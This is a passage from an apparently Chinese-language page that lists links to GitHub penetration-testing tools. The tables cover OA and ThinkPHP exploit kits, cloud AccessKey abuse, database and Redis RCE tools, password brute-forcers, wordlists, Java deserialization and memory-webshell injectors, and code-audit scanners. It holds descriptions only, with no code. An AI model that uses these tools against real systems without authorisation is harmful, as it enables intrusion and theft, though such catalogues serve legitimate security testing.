<td>漏洞POC基本适用ThinkPHP全版本漏洞</td>
<td><a href="https://github.com/zangcc/Aazhen-RexHa">https://github.com/zangcc/Aazhen-RexHa</a></td>
<td>RexHa</td>
</tr>
<tr>
<td>Thinkphp(GUI)漏洞利用工具，支持各版本TP漏洞检测，命令执行，getshell。</td>
<td><a href="https://github.com/Lotus6/ThinkphpGUI">https://github.com/Lotus6/ThinkphpGUI</a></td>
<td>ThinkphpGUI</td>
</tr>
<tr>
<td>ThinkPHP 漏洞 综合利用工具, 图形化界面, 命令执行, 一键getshell, 批量检测, 日志遍历, session包含, 宝塔绕过</td>
<td><a href="https://github.com/bewhale/thinkphp_gui_tools">https://github.com/bewhale/thinkphp_gui_tools</a></td>
<td>thinkphp_gui_tools</td>
</tr>
<tr>
<td>致远OA综合利用工具</td>
<td><a href="https://github.com/Summer177/seeyon_exp">https://github.com/Summer177/seeyon_exp</a></td>
<td>seeyon_exp</td>
</tr>
<tr>
<td>致远OA综合利用工具GUI-V1.0</td>
<td><a href="https://github.com/God-Ok/SeeyonExploit-GUI">https://github.com/God-Ok/SeeyonExploit-GUI</a></td>
<td>SeeyonExploit-GUI</td>
</tr>
<tr>
<td>通达OA综合利用工具</td>
<td><a href="https://github.com/xinyu2428/TDOA_RCE">https://github.com/xinyu2428/TDOA_RCE</a></td>
<td>TDOA_RCE</td>
</tr>
<tr>
<td>蓝凌OA漏洞利用工具&#x2F;前台无条件RCE&#x2F;文件写入</td>
<td><a href="https://github.com/yuanhaiGreg/LandrayExploit">https://github.com/yuanhaiGreg/LandrayExploit</a></td>
<td>LandrayExploit</td>
</tr>
<tr>
<td>泛微OA漏洞综合利用脚本</td>
<td><a href="https://github.com/z1un/weaver_exp">https://github.com/z1un/weaver_exp</a></td>
<td>weaver_exp</td>
</tr>
<tr>
<td>泛微oa漏洞利用工具</td>
<td><a href="https://github.com/TD0U/WeaverScan">https://github.com/TD0U/WeaverScan</a></td>
<td>WeaverScan</td>
</tr>
<tr>
<td>帆软bi反序列化漏洞利用工具</td>
<td><a href="https://github.com/yecp181/Frchannel">https://github.com/yecp181/Frchannel</a></td>
<td>Frchannel</td>
</tr>
</tbody></table>
<h2 id="信息泄露利用工具"><a href="#信息泄露利用工具" class="headerlink" title="信息泄露利用工具"></a>信息泄露利用工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>六大云存储，泄露利用检测工具</td>
<td><a href="https://github.com/UzJu/Cloud-Bucket-Leak-Detection-Tools">https://github.com/UzJu/Cloud-Bucket-Leak-Detection-Tools</a></td>
<td>Cloud-Bucket-Leak-Detection-Tools</td>
</tr>
<tr>
<td>AK资源管理工具，阿里云&#x2F;腾讯云 AccessKey AccessKeySecret</td>
<td><a href="https://github.com/wyzxxz/aksk_tool">https://github.com/wyzxxz/aksk_tool</a></td>
<td>aksk_tool</td>
</tr>
<tr>
<td>阿里云accesskey利用工具</td>
<td><a href="https://github.com/mrknow001/aliyun-accesskey-Tools">https://github.com/mrknow001/aliyun-accesskey-Tools</a></td>
<td>aliyun-accesskey-Tools</td>
</tr>
<tr>
<td>swagger-exp Swagger  REST API 信息泄露利用工具</td>
<td><a href="https://github.com/lijiejie/swagger-exp">https://github.com/lijiejie/swagger-exp</a></td>
<td>swagger-exp</td>
</tr>
<tr>
<td>swagger-hack 自动化爬取并测试所有swagger-ui.html接口</td>
<td><a href="https://github.com/jayus0821/swagger-hack">https://github.com/jayus0821/swagger-hack</a></td>
<td>swagger-hack</td>
</tr>
<tr>
<td>heapdump敏感信息查询工具</td>
<td><a href="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a></td>
<td>heapdump_tool</td>
</tr>
<tr>
<td>HeapDump敏感信息提取工具</td>
<td><a href="https://github.com/whwlsfb/JDumpSpider">https://github.com/whwlsfb/JDumpSpider</a></td>
<td>JDumpSpider</td>
</tr>
<tr>
<td>Packer Fuzzer  针对Webpack等前端打包工具所构造的网站进行检测的扫描工具</td>
<td><a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></td>
<td>Packer-Fuzzer</td>
</tr>
<tr>
<td>.git源代码泄露利用工具</td>
<td><a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a></td>
<td>GitHack</td>
</tr>
<tr>
<td>.cvs源代码泄露利用工具</td>
<td><a href="https://github.com/kost/dvcs-ripper.git">https://github.com/kost/dvcs-ripper.git</a></td>
<td>dvcs-ripper</td>
</tr>
<tr>
<td>.DS_store文件泄露利用工具</td>
<td><a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></td>
<td>ds_store_exp</td>
</tr>
<tr>
<td>SvnExploit支持SVN源代码泄露全版本Dump源码</td>
<td><a href="https://github.com/admintony/svnExploit">https://github.com/admintony/svnExploit</a></td>
<td>svnExploit</td>
</tr>
<tr>
<td>git-dumper 从网站转储git存储库的工具</td>
<td><a href="https://github.com/arthaud/git-dumper">https://github.com/arthaud/git-dumper</a></td>
<td>git-dumper</td>
</tr>
<tr>
<td>GitDorker  通过使用大型的dorks库来从GitHub抓取敏感信息</td>
<td><a href="https://github.com/obheda12/GitDorker">https://github.com/obheda12/GitDorker</a></td>
<td>GitDorker</td>
</tr>
<tr>
<td>从JavaScript文件中提取敏感信息</td>
<td><a href="https://github.com/m4ll0k/SecretFinder">https://github.com/m4ll0k/SecretFinder</a></td>
<td>SecretFinder</td>
</tr>
<tr>
<td>功能比较多的一个JavaScript侦查自动化脚本</td>
<td><a href="https://github.com/KathanP19/JSFScan.sh">https://github.com/KathanP19/JSFScan.sh</a></td>
<td>JSFScan</td>
</tr>
<tr>
<td>子域名接管漏洞检测工具，支持30+云服务托管检测</td>
<td><a href="https://github.com/Ice3man543/SubOver">https://github.com/Ice3man543/SubOver</a></td>
<td>SubOver</td>
</tr>
<tr>
<td>一个小程序、公众号、企业微信、飞书、钉钉等泄露secert后利用工具</td>
<td><a href="https://github.com/mrknow001/API-Explorer">https://github.com/mrknow001/API-Explorer</a></td>
<td>API-Explorer</td>
</tr>
<tr>
<td>互联网厂商API利用工具。</td>
<td><a href="https://github.com/pykiller/API-T00L">https://github.com/pykiller/API-T00L</a></td>
<td>API-T00L</td>
</tr>
<tr>
<td>混合盘APP - 网盘搜索、磁力搜索 - 搜索20个百度网盘、阿里网盘、夸克网盘以及磁力资源</td>
<td><a href="https://github.com/misiai/hunhepan">https://github.com/misiai/hunhepan</a></td>
<td>hunhepan</td>
</tr>
<tr>
<td>云资产管理工具 目前工具定位是云安全相关工具，目前是两个模块 云存储工具、云服务工具， 云存储工具主要是针对oss存储、查看、删除、上传、下载、预览等等 云服务工具主要是针对rds、服务器的管理，查看、执行命令、接管等等</td>
<td><a href="https://github.com/dark-kingA/cloudTools">https://github.com/dark-kingA/cloudTools</a></td>
<td>cloudTools</td>
</tr>
</tbody></table>
<h2 id="数据库利用工具"><a href="#数据库利用工具" class="headerlink" title="数据库利用工具"></a>数据库利用工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>MDUT 2.0 数据库利用工具</td>
<td><a href="https://github.com/SafeGroceryStore/MDUT">https://github.com/SafeGroceryStore/MDUT</a></td>
<td>MDUT</td>
</tr>
<tr>
<td>数据库综合利用工具</td>
<td><a href="https://github.com/Ryze-T/Sylas">https://github.com/Ryze-T/Sylas</a></td>
<td>Sylas</td>
</tr>
<tr>
<td>综合高危漏洞利用工具(包含各大数据库)</td>
<td><a href="https://github.com/Liqunkit/LiqunKit">https://github.com/Liqunkit/LiqunKit</a>_</td>
<td>LiqunKit</td>
</tr>
<tr>
<td>一款用Go语言编写的数据库自动化提权工具</td>
<td><a href="https://github.com/Hel10-Web/Databasetools">https://github.com/Hel10-Web/Databasetools</a></td>
<td>Databasetools</td>
</tr>
<tr>
<td>Team IDE 工具 集成MySql、Oracle、金仓、达梦、神通等数据库、SSH、FTP、Redis、Zookeeper、Kafka、Elasticsearch等管理工具</td>
<td><a href="https://github.com/team-ide/">https://github.com/team-ide/</a></td>
<td>teamide</td>
</tr>
<tr>
<td>sqlserver利用工具，可上传下载文件，xp_cmdshell与sp_oacreate执行命令回显和clr加载程序集执行相应操作。</td>
<td><a href="https://github.com/uknowsec/SharpSQLTools">https://github.com/uknowsec/SharpSQLTools</a></td>
<td>SharpSQLTools</td>
</tr>
<tr>
<td>通过套接字重用通过受损的 Microsoft SQL Server  在受限环境中执行横向移动</td>
<td><a href="https://github.com/blackarrowsec/mssqlproxy">https://github.com/blackarrowsec/mssqlproxy</a></td>
<td>mssqlproxy</td>
</tr>
<tr>
<td>ODAT：Oracle 数据库攻击工具</td>
<td><a href="https://github.com/quentinhardy/odat">https://github.com/quentinhardy/odat</a></td>
<td>ODAT</td>
</tr>
<tr>
<td>Redis未授权访问漏洞利用工具</td>
<td><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></td>
<td>redis-rogue-server</td>
</tr>
<tr>
<td>Redis未授权访问漏洞利用工具2</td>
<td><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></td>
<td>redis-rce</td>
</tr>
<tr>
<td>Redis 漏洞利用工具</td>
<td><a href="https://github.com/yuyan-sec/RedisEXP">https://github.com/yuyan-sec/RedisEXP</a></td>
<td>RedisEXP</td>
</tr>
<tr>
<td>redis主从复制rce的go版本</td>
<td><a href="https://github.com/zyylhn/redis_rce">https://github.com/zyylhn/redis_rce</a></td>
<td>redis_rce</td>
</tr>
</tbody></table>
<h2 id="爆破利用工具"><a href="#爆破利用工具" class="headerlink" title="爆破利用工具"></a>爆破利用工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>还是推荐fscan吧，还是还用，更新也快</td>
<td><a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></td>
<td>fscan</td>
</tr>
<tr>
<td>zombie主要为了解决需要全场景(外网、内网、云)的服务的口令爆破功能</td>
<td><a href="https://github.com/chainreactors/zombie">https://github.com/chainreactors/zombie</a></td>
<td>zombie</td>
</tr>
<tr>
<td>爆破神器，懂得都懂</td>
<td><a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></td>
<td>hydra</td>
</tr>
<tr>
<td>超级弱口令检查工具是一款Windows平台的弱口令审计工具</td>
<td><a href="https://github.com/shack2/SNETCracker">https://github.com/shack2/SNETCracker</a></td>
<td>超级弱口令</td>
</tr>
<tr>
<td>FTP,SSH,MYSQL,MSSQL等弱口令爆破工具</td>
<td><a href="https://github.com/BBD-YZZ/week-passwd">https://github.com/BBD-YZZ/week-passwd</a></td>
<td>week-passwd</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>一款面向企业的渗透测试字典生成工具。</td>
<td><a href="https://github.com/ccc-f/Fdict">https://github.com/ccc-f/Fdict</a></td>
<td>Fdict</td>
</tr>
<tr>
<td>爆破Azure, ADFS, OWA, O365, Teams，smtp</td>
<td><a href="https://github.com/nodauf/GoMapEnum">https://github.com/nodauf/GoMapEnum</a></td>
<td>GoMapEnum</td>
</tr>
<tr>
<td>Boom 是一款基于无头浏览器的智能 Web 弱口令（后台密码）爆破工具</td>
<td><a href="https://github.com/Fly-Playgroud/Boom">https://github.com/Fly-Playgroud/Boom</a></td>
<td>Boom</td>
</tr>
</tbody></table>
<h2 id="全网字典收集"><a href="#全网字典收集" class="headerlink" title="全网字典收集"></a>全网字典收集</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>用户名密码字典生成工具(将中文汉字姓名转成14种格式的拼音、IP地址处理、网络设备密码生成)</td>
<td><a href="https://github.com/abc123info/UserNameDictTools">https://github.com/abc123info/UserNameDictTools</a></td>
<td>UserNameDictTools</td>
</tr>
<tr>
<td>该工具是使用javaFX开发的基于信息收集进行组合生成密码字典的工具，可以快速组成密码字典。</td>
<td><a href="https://github.com/kkbo8005/dicttools">https://github.com/kkbo8005/dicttools</a></td>
<td>dicttools</td>
</tr>
<tr>
<td>一个字典列表生成框架</td>
<td><a href="https://github.com/glitchedgitz/cook">https://github.com/glitchedgitz/cook</a></td>
<td>cook</td>
</tr>
<tr>
<td>渗透测试、SRC漏洞挖掘、爆破、Fuzzing等字典收集项目</td>
<td><a href="https://github.com/insightglacier/Dictionary-Of-Pentesting">https://github.com/insightglacier/Dictionary-Of-Pentesting</a></td>
<td>Dictionary-Of-Pentesting</td>
</tr>
<tr>
<td>1337 Wordlists for Bug Bounty Hunting</td>
<td><a href="https://github.com/0xPugazh/fuzz4bounty">https://github.com/0xPugazh/fuzz4bounty</a></td>
<td>fuzz4bfuzz4bountyounty</td>
</tr>
<tr>
<td>Fuzz 字典,一个就够了</td>
<td><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></td>
<td>Web Pentesting</td>
</tr>
<tr>
<td>Web 模糊测试字典与一些Payloads</td>
<td><a href="https://github.com/gh0stkey/Web-Fuzzing-Box">https://github.com/gh0stkey/Web-Fuzzing-Box</a></td>
<td>Web Fuzzing Box</td>
</tr>
<tr>
<td>安全评估期间使用的多种类型列表的集合</td>
<td><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></td>
<td>SecLists</td>
</tr>
<tr>
<td>渗透测试仪和Bug赏金猎人的 Payload 库</td>
<td><a href="https://github.com/sh377c0d3/Payloads">https://github.com/sh377c0d3/Payloads</a></td>
<td>Payloads</td>
</tr>
<tr>
<td>基于实战沉淀下的各种弱口令字典</td>
<td><a href="https://github.com/fuzz-security/SuperWordlist">https://github.com/fuzz-security/SuperWordlist</a></td>
<td>SuperWordlist</td>
</tr>
<tr>
<td>各类漏洞的 TOP25 参数字典</td>
<td><a href="https://github.com/lutfumertceylan/top25-parameter">https://github.com/lutfumertceylan/top25-parameter</a></td>
<td>top25-parameter</td>
</tr>
<tr>
<td>提取收集以往泄露的密码中符合条件的强弱密码</td>
<td><a href="https://github.com/r35tart/RW_Password">https://github.com/r35tart/RW_Password</a></td>
<td>RW_Password</td>
</tr>
<tr>
<td>实战沉淀字典</td>
<td><a href="https://github.com/SexyBeast233/SecDictionary">https://github.com/SexyBeast233/SecDictionary</a></td>
<td>SecDictionary</td>
</tr>
</tbody></table>
<h2 id="常规漏洞利用工具"><a href="#常规漏洞利用工具" class="headerlink" title="常规漏洞利用工具"></a>常规漏洞利用工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>Web 渗透测试 &#x2F;CTF 的有用的payload大全</td>
<td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a></td>
<td>PayloadsAllTheThings</td>
</tr>
<tr>
<td>您将在其中找到我在 CTF、现实生活应用程序以及阅读研究和新闻中学到的每一个技巧 &#x2F; 技巧 &#x2F; 任何东西。</td>
<td><a href="https://github.com/HackTricks-wiki/hacktricks">https://github.com/HackTricks-wiki/hacktricks</a></td>
<td>hacktricks</td>
</tr>
<tr>
<td>DalFox 是一款功能强大的开源 XSS 扫描工具和参数分析器、实用工具</td>
<td><a href="https://github.com/hahwul/dalfox">https://github.com/hahwul/dalfox</a></td>
<td>dalfox</td>
</tr>
<tr>
<td>基于DOM的快速XSS漏洞扫描程序</td>
<td><a href="https://github.com/dwisiswant0/findom-xss">https://github.com/dwisiswant0/findom-xss</a></td>
<td>findom-xss</td>
</tr>
<tr>
<td>一款基于 Chromium的XSS检测工具</td>
<td><a href="https://github.com/v8blink/Chromium-based-XSS-Taint-Tracking">https://github.com/v8blink/Chromium-based-XSS-Taint-Tracking</a></td>
<td>Chromium-based-XSS-Taint-Tracking</td>
</tr>
<tr>
<td>很常用的XSS平台</td>
<td><a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a></td>
<td>beef</td>
</tr>
<tr>
<td>Fast CRLF injection scanning tool</td>
<td><a href="https://github.com/Nefcore/CRLFsuite">https://github.com/Nefcore/CRLFsuite</a></td>
<td>CRLFsuite</td>
</tr>
<tr>
<td>快速 CORS 错误配置漏洞扫描程序</td>
<td><a href="https://github.com/chenjj/CORScanner">https://github.com/chenjj/CORScanner</a></td>
<td>CORScanner</td>
</tr>
<tr>
<td>xxe利用工具</td>
<td><a href="https://github.com/BuffaloWill/oxml_xxe">https://github.com/BuffaloWill/oxml_xxe</a></td>
<td>oxml_xxe</td>
</tr>
<tr>
<td>xxe利用工具2</td>
<td><a href="https://github.com/whitel1st/docem">https://github.com/whitel1st/docem</a></td>
<td>docem</td>
</tr>
<tr>
<td>UEditor编辑器批量GetShell &#x2F; Code By:Tas9er</td>
<td><a href="https://github.com/Tas9er/UEditorGetShell">https://github.com/Tas9er/UEditorGetShell</a></td>
<td>UEditorGetShell</td>
</tr>
<tr>
<td>子域名接管工具</td>
<td><a href="https://github.com/michenriksen/aquatone">https://github.com/michenriksen/aquatone</a></td>
<td>aquatone</td>
</tr>
<tr>
<td>用于查找常见的Nginx错误配置和漏洞。</td>
<td><a href="https://github.com/stark0de/nginxpwner">https://github.com/stark0de/nginxpwner</a></td>
<td>nginxpwner</td>
</tr>
<tr>
<td>文件包含自动化利用工具</td>
<td><a href="https://github.com/hansmach1ne/lfimap">https://github.com/hansmach1ne/lfimap</a></td>
<td>lfimap</td>
</tr>
<tr>
<td>文件包含利用工具</td>
<td><a href="https://github.com/mzfr/liffy">https://github.com/mzfr/liffy</a></td>
<td>liffy</td>
</tr>
<tr>
<td>具有交互式界面的自动 SSTI 检测工具</td>
<td><a href="https://github.com/vladko312/SSTImap">https://github.com/vladko312/SSTImap</a></td>
<td>SSTImap</td>
</tr>
<tr>
<td>A simple SSRF-testing sheriff written in Go</td>
<td><a href="https://github.com/teknogeek/ssrf-sheriff">https://github.com/teknogeek/ssrf-sheriff</a></td>
<td>ssrf-sheriff</td>
</tr>
<tr>
<td>SSRFmap，利用它可检测与利用 SSRF 漏洞， 同时它也整合了一些常用漏洞可以结合 SSRF 去利用</td>
<td><a href="https://github.com/swisskyrepo/SSRFmap">https://github.com/swisskyrepo/SSRFmap</a></td>
<td>ssrfmap</td>
</tr>
<tr>
<td>用于测试、调整和破解JSON Web令牌的工具包</td>
<td><a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></td>
<td>jwt_tool</td>
</tr>
<tr>
<td>jwt hack是jwt黑客&#x2F;安全测试的工具。支持En&#x2F;解码JWT，生成JWT攻击和非常快速破解的有效载荷（dict&#x2F;brutefoce）</td>
<td><a href="https://github.com/hahwul/jwt-hack">https://github.com/hahwul/jwt-hack</a></td>
<td>jwt-hack</td>
</tr>
<tr>
<td>XSS spider - 66&#x2F;66 wavsep XSS detected</td>
<td><a href="https://github.com/DanMcInerney/xsscrapy">https://github.com/DanMcInerney/xsscrapy</a></td>
<td>xsscrapy</td>
</tr>
<tr>
<td>针对JWT渗透开发的漏洞验证&#x2F;密钥爆破工具，针对CVE-2015-9235&#x2F;空白密钥&#x2F;未验证签名攻击&#x2F;CVE-2016-10555&#x2F;CVE-2018-0114&#x2F;CVE-2020-28042的结果生成用于FUZZ，也可使用字典&#x2F;字符枚举(包括JJWT)的方式进行爆破(JWT Crack)</td>
<td><a href="https://github.com/z-bool/Venom-JWT">https://github.com/z-bool/Venom-JWT</a></td>
<td>Venom-JWT</td>
</tr>
</tbody></table>
<h2 id="反序列化利用工具"><a href="#反序列化利用工具" class="headerlink" title="反序列化利用工具"></a>反序列化利用工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>JYso是一个可以用于 jndi 注入攻击和生成反序列化数据流的工具。</td>
<td><a href="https://github.com/qi4L/JYso">https://github.com/qi4L/JYso</a></td>
<td>JYso</td>
</tr>
<tr>
<td>生成 Java 反序列化负载的概念验证</td>
<td><a href="https://github.com/Whoopsunix/PPPYSO">https://github.com/Whoopsunix/PPPYSO</a></td>
<td>PPPYSO</td>
</tr>
<tr>
<td>项目为 ysoserial [su18] 专版，取名为 ysuserial ，在原项目 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 基础上魔改而来</td>
<td><a href="https://github.com/su18/ysoserial/">https://github.com/su18/ysoserial/</a></td>
<td>ysuserial</td>
</tr>
<tr>
<td>图形化Java反序列化利用工具，集成Ysoserial</td>
<td><a href="https://github.com/0ofo/Deswing">https://github.com/0ofo/Deswing</a></td>
<td>Deswing</td>
</tr>
<tr>
<td>jndi注入工具v1.4</td>
<td><a href="https://github.com/WhiteHSBG/JNDIExploit">https://github.com/WhiteHSBG/JNDIExploit</a></td>
<td>JNDIExploit</td>
</tr>
<tr>
<td>JNDI服务利用工具 RMI&#x2F;LDAP，支持部分场景回显、内存shell，高版本JDK场景下利用等，fastjson rce命令执行，log4j rce命令执行 漏洞检测辅助工具</td>
<td><a href="https://github.com/wyzxxz/jndi_tool">https://github.com/wyzxxz/jndi_tool</a></td>
<td>jndi_tool</td>
</tr>
<tr>
<td>TopicsYsomap是一款适配于各类实际复杂环境的Java反序列化利用框架，可动态配置具备不同执行效果的Java反序列化利用链payload。</td>
<td><a href="https://github.com/wh1t3p1g/ysomap">https://github.com/wh1t3p1g/ysomap</a></td>
<td>ysomap</td>
</tr>
<tr>
<td>原版反序列化利用工具</td>
<td><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></td>
<td>ysoserial</td>
</tr>
<tr>
<td>ysoserial修改版，着重修改<code>ysoserial.payloads.util.Gadgets.createTemplatesImpl</code>使其可以通过引入自定义class的形式来执行命令、内存马、反序列化回显</td>
<td><a href="https://github.com/Y4er/ysoserial">https://github.com/Y4er/ysoserial</a></td>
<td>ysoserial修改版</td>
</tr>
<tr>
<td>魔改版ysoserial，有更多方便的命令</td>
<td><a href="https://kgithub.com/woodpecker-framework/ysoserial-for-woodpecker">https://kgithub.com/woodpecker-framework/ysoserial-for-woodpecker</a></td>
<td>ysoserial-for-woodpecker</td>
</tr>
<tr>
<td>解决FastJson、Jackson、Log4j2、原生JNDI注入漏洞的高版本JDKBypass利用，探测本地可用反序列化gadget达到命令执行、回显命令执行、内存马注入</td>
<td><a href="https://github.com/exp1orer/JNDI-Inject-Exploit">https://github.com/exp1orer/JNDI-Inject-Exploit</a></td>
<td>JNDI-Inject-Exploit</td>
</tr>
<tr>
<td>MySQL Fake Server (纯Java实现，内置常见Java反序列化Payload，支持GUI版和命令行版，提供Dockerfile)</td>
<td><a href="https://github.com/4ra1n/mysql-fake-server">https://github.com/4ra1n/mysql-fake-server</a></td>
<td>mysql-fake-server</td>
</tr>
<tr>
<td>rmi打内存马工具，适用于目标用不了ldap的情况</td>
<td><a href="https://github.com/novysodope/RMI_Inj_MemShell">https://github.com/novysodope/RMI_Inj_MemShell</a></td>
<td>RMI_Inj_MemShell</td>
</tr>
<tr>
<td>marshalsec是一款java反序列利用工具，其可以很方便的起一个ldap或rmi服务，通过这些服务来去访问攻击者准备好的恶意执行类来达到远程命令执行或入侵的目的。</td>
<td><a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></td>
<td>marshalsec</td>
</tr>
<tr>
<td>使用 agent 实现反序列化 utf8 overlong</td>
<td><a href="https://github.com/Ar3h/utf8-overlong-agent">https://github.com/Ar3h/utf8-overlong-agent</a></td>
<td>utf8-overlong-agent</td>
</tr>
</tbody></table>
<h2 id="内存马注入工具"><a href="#内存马注入工具" class="headerlink" title="内存马注入工具"></a>内存马注入工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>一款支持高度自定义的 Java 内存马生成工具</td>
<td><a href="https://github.com/pen4uin/java-memshell-generator-release">https://github.com/pen4uin/java-memshell-generator-release</a></td>
<td>java-memshell-generator-release</td>
</tr>
<tr>
<td>Java内存马注入工具</td>
<td><a href="https://github.com/WisteriaTiger/JundeadShell">https://github.com/WisteriaTiger/JundeadShell</a></td>
<td>JundeadShell</td>
</tr>
<tr>
<td>拿来即用的Tomcat内存马</td>
<td><a href="https://github.com/ce-automne/TomcatMemShell">https://github.com/ce-automne/TomcatMemShell</a></td>
<td>TomcatMemShell</td>
</tr>
<tr>
<td>Memory WebShell Generator</td>
<td><a href="https://github.com/hosch3n/msmap">https://github.com/hosch3n/msmap</a></td>
<td>msmap</td>
</tr>
<tr>
<td>用Java agent实现内存马等功能</td>
<td><a href="https://github.com/ethushiroha/JavaAgentTools">https://github.com/ethushiroha/JavaAgentTools</a></td>
<td>JavaAgentTools</td>
</tr>
<tr>
<td>多功能 java agent 内存马</td>
<td><a href="https://github.com/veo/vagent">https://github.com/veo/vagent</a></td>
<td>vagent</td>
</tr>
</tbody></table>
<h2 id="代码审计辅助工具-通用"><a href="#代码审计辅助工具-通用" class="headerlink" title="代码审计辅助工具-通用"></a>代码审计辅助工具-通用</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>这是一个调用chatGPT进行代码审计的工具。</td>
<td><a href="https://github.com/Kento-Sec/chatGPT-CodeReview">https://github.com/Kento-Sec/chatGPT-CodeReview</a></td>
<td>chatGPT-CodeReview</td>
</tr>
<tr>
<td>源代码静态分析工具，支持Java、PHP、C#、Python、Go等27种编程语言，而且能够集成在IDE、Jenkins、Git等服务。</td>
<td><a href="https://www.sonarqube.org/">https://www.sonarqube.org</a></td>
<td>SonarQube</td>
</tr>
<tr>
<td>一种适用于 C++、C#、VB、PHP、Java、PL&#x2F;SQL 和 COBOL 的自动化代码安全审查工具。</td>
<td><a href="https://sourceforge.net/projects/visualcodegrepp/">https://sourceforge.net/projects/visualcodegrepp/</a></td>
<td>VCG(VisualCodeGrepper)</td>
</tr>
<tr>
<td>开源安全产品源码，IDS、IPS、WAF、蜜罐等</td>
<td><a href="https://github.com/birdhan/SecurityProduct">https://github.com/birdhan/SecurityProduct</a></td>
<td>SecurityProduct</td>
</tr>
</tbody></table>
<h2 id="代码审计辅助工具-java"><a href="#代码审计辅助工具-java" class="headerlink" title="代码审计辅助工具-java"></a>代码审计辅助工具-java</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>一个用于分析Jar包的GUI工具，可以用多种方式搜索你想要的信息，自动构建方法调用关系，支持分析Spring框架（A Java GUI Tool for Analyzing Jar）</td>
<td><a href="https://github.com/4ra1n/jar-analyzer-gui">https://github.com/4ra1n/jar-analyzer-gui</a></td>
<td>jar-analyzer-gui</td>
</tr>
<tr>
<td>一款轻量级匹配Sink点的代码审计扫描器，为了帮助红队过程中快速代码审计的小工具</td>
<td><a href="https://github.com/Zjackky/CodeScan">https://github.com/Zjackky/CodeScan</a></td>
<td>CodeScan</td>
</tr>
<tr>
<td>“铲子”是一款简单易用的JAVA SAST工具，旨在为安全工程师提供一款简单、好用、价格厚道的代码安全扫描产品，支持语言: java（Servlet、spring、dubbo、thirft、mybatis、jsp） ，采用轻量级污点分析，铲子会将java、xml（mybatis、dubbo）等统一构建数据流图，然后进行污点分析，无需编译，也可以反编译扫描jar或class，内置了 sql 注入、命令注入、文件上传、ssrf 等常见漏洞规则，用户可以自定义规则。</td>
<td><a href="https://github.com/Chanzi-keji/chanzi">https://github.com/Chanzi-keji/chanzi</a></td>
<td>chanzi</td>
</tr>
<tr>
<td><code>SecurityInspector</code> 是一个静态代码扫描插件，内置了常见的<code>Java</code> 代码<code>Web</code>漏洞<code>sink</code> 点，高危组件调用<code>sink</code> 点，识别项目中可能存在的过滤器（如<code>XSS</code>过滤器、<code>SQLI</code>过滤器等&lt;此功能存在较多<code>bug</code> ，将会于正式版上线&gt;），并使用<code>IDEA</code>的<code>PSI</code> 和<code>Intercept</code>机制来对以上内容进行快速定位。</td>
<td><a href="https://github.com/SpringKill-team/SecurityInspector">https://github.com/SpringKill-team/SecurityInspector</a></td>
<td>SecurityInspector</td>
</tr>
<tr>
<td>JavaWeb漏洞审计工具，构建方法调用链并模拟栈帧进行分析</td>
<td><a href="https://github.com/4ra1n/code-inspector">https://github.com/4ra1n/code-inspector</a></td>
<td>code-inspector</td>
</tr>
<tr>
<td>闭源系统半自动漏洞挖掘工具，针对 jar&#x2F;war&#x2F;zip 进行静态代码分析，增加 LLM 大模型能力验证路径可达性，LLM 根据上下文代码环境给出该路径可信分数</td>
<td><a href="https://github.com/Phelaine/SinkFinder">https://github.com/Phelaine/SinkFinder</a></td>
<td>SinkFinder</td>
</tr>
<tr>
<td>开源的被动式交互式安全测试(IAST)产品</td>
<td><a href="https://github.com/HXSecurity/DongTai">https://github.com/HXSecurity/DongTai</a></td>
<td>DongTai</td>
</tr>
<tr>
<td>CodeQLpy是一款基于CodeQL实现的半自动化代码审计工具，目前仅支持java语言。实现从源码反编译，数据库生成，脆弱性发现的全过程，可以辅助代码审计人员快速定位源码可能存在的漏洞。</td>
<td><a href="https://github.com/webraybtl/CodeQLpy">https://github.com/webraybtl/CodeQLpy</a></td>
<td>CodeQLpy</td>
</tr>
<tr>
<td>免费开源的语义代码分析引擎和查询工具</td>
<td><a href="https://github.com/github/codeql-cli-binaries">https://github.com/github/codeql-cli-binaries</a></td>
<td>CodeQL</td>
</tr>
<tr>
